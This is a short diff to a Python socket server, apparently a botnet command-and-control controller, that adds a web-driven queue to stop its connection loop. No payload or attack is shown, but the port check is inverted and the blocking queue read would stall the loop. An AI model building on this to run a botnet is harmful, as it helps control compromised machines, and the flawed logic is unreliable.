@@ -44,7 +44,7 @@ def reception(queue, conn, addr):
 
 
 
-def start_botnet(port):
+def start_botnet(port, queue_web):
     if not port or port < 1023 or port > 65535:
         print("démarrage du serveur sur le port " + str(port))
 
@@ -79,6 +79,8 @@ def start_botnet(port):
         while running:
             # print("running")
             # print(connection_list)
+            if queue_web.get() == 'stop' :
+                running = False
 
             read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)
 
